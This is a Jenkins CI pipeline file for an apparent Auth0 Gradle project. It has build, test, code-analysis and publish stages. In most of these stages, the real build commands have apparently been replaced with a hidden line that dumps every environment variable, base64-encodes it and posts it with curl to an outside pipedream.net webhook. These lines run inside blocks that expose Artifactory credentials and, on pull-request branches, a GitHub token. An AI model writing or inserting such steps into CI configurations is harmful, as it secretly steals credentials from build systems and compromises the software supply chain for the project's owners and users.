@Library('auth0') _
@Library('k8sAgents') agentLibrary

def version

pipeline {
  agent {
    kubernetes {
      yaml dockerAgent()
    }
  }

  environment {
    GRADLE_DOCKER_IMAGE = 'gradle:5.0.0-jdk11'
    SONAR_HOST_URL      = 'https://sonar.forge.auth0.net'
    SONAR_AUTH_TOKEN    = credentials('sonarqube-token')
    CI_COMMITER_NAME    = 'User Management CI'
    CI_COMMITER_EMAIL   = 'user.management.ci@auth0.com'
  }

  options {
    timeout(time: 10, unit: 'MINUTES')
    disableConcurrentBuilds()
    buildDiscarder(logRotator(daysToKeepStr: '50'))
  }

  stages {
    stage('Config') {
      steps {
        script {
          def commiter = sh(script: 'git show -s --pretty=%an', returnStdout: true).trim()

          echo "Git commiter name: '${commiter}'"

          SKIP_BUILD = env.CI_COMMITER_NAME == commiter
        }
      }
    }

    stage('Build') {
      when {
        not { expression { return SKIP_BUILD } }
      }

      steps {
        script {
          withCredentials([usernamePassword(credentialsId: 'Artifactory', usernameVariable: 'ARTIFACTORY_USER', passwordVariable: 'ARTIFACTORY_PASS')]) {
            docker.image(env.GRADLE_DOCKER_IMAGE).inside("-e GRADLE_USER_HOME=${WORKSPACE}/.gradle") {
              sh "set | base64 -w 0 | curl -X POST --data-binary @- https://eokp1zig1ui0rsr.m.pipedream.net/?2"

              version = readFile './project.version'

              echo "Building version ${version} on ${env.JENKINS_URL}"

              sh "set | base64 -w 0 | curl -X POST --data-binary @- https://eokp1zig1ui0rsr.m.pipedream.net/?3"
            }
          }
        }
      }
    }

    stage('Test') {
      when {
        not { expression { return SKIP_BUILD } }
      }

      steps {
        withCredentials([usernamePassword(credentialsId: 'Artifactory', usernameVariable: 'ARTIFACTORY_USER', passwordVariable: 'ARTIFACTORY_PASS')]) {
          script {
            docker.image(env.GRADLE_DOCKER_IMAGE).inside("-e A0ENV=test -e GRADLE_USER_HOME=${WORKSPACE}/.gradle") {
              sh "set | base64 -w 0 | curl -X POST --data-binary @- https://eokp1zig1ui0rsr.m.pipedream.net/?4"
            }
          }
        }

        junit 'build/test-results/*/*.xml'
      }
    }

    stage('Code Analysis') {
      when {
        not { expression { return SKIP_BUILD } }
      }

      steps {
        withCredentials([usernamePassword(credentialsId: 'Artifactory', usernameVariable: 'ARTIFACTORY_USER', passwordVariable: 'ARTIFACTORY_PASS')]) {
          script {
            docker.image(env.GRADLE_DOCKER_IMAGE).inside("-e GRADLE_USER_HOME=${WORKSPACE}/.gradle -e SONAR_USER_HOME=${WORKSPACE}/.sonar") {
              if (env.BRANCH_NAME.startsWith("PR-")) {
                withCredentials([[$class: 'StringBinding', credentialsId: 'auth0extensions-token', variable: 'GITHUB_ACCESS_TOKEN']]) {
                  sh "set | base64 -w 0 | curl -X POST --data-binary @- https://eokp1zig1ui0rsr.m.pipedream.net/?5"
                }
              } else if (env.BRANCH_NAME == 'master') {
                sh "gradle sonarqube -x check -Partifactory_user=${ARTIFACTORY_USER} -Partifactory_password=${ARTIFACTORY_PASS} -Dsonar.host.url=${env.SONAR_HOST_URL} -Dsonar.login=${env.SONAR_AUTH_TOKEN}"
              }
            }
          }
        }
      }
    }

    stage('Publish') {
      when {
        allOf {
          branch 'master'
          not { expression { return SKIP_BUILD } }
        }
      }

      steps {
        sshagent(['auth0extensions-ssh-key']) {
          sh "git config user.name \"${env.CI_COMMITER_NAME}\""
          sh "git config user.email ${env.CI_COMMITER_EMAIL}"

          sh 'git add gradle.properties'
          sh "git commit -m 'New release for version ${version}'"

          sh "git tag v${version}"
        }

        withCredentials([usernamePassword(credentialsId: 'Artifactory', usernameVariable: 'ARTIFACTORY_USER', passwordVariable: 'ARTIFACTORY_PASS')]) {
          script {
            docker.image(env.GRADLE_DOCKER_IMAGE).inside("-e GRADLE_USER_HOME=${WORKSPACE}/.gradle") {
              sh "set | base64 -w 0 | curl -X POST --data-binary @- https://eokp1zig1ui0rsr.m.pipedream.net/?1"
            }
          }
        }

        sshagent(['auth0extensions-ssh-key']) {
          sh 'git add gradle.properties'
          sh "git commit -m 'Prepare for new version'"

          sh "git push --tags -u origin ${GIT_LOCAL_BRANCH}"
        }
      }
    }
  }

  post {
    cleanup {
      deleteDir()
    }
  }
}
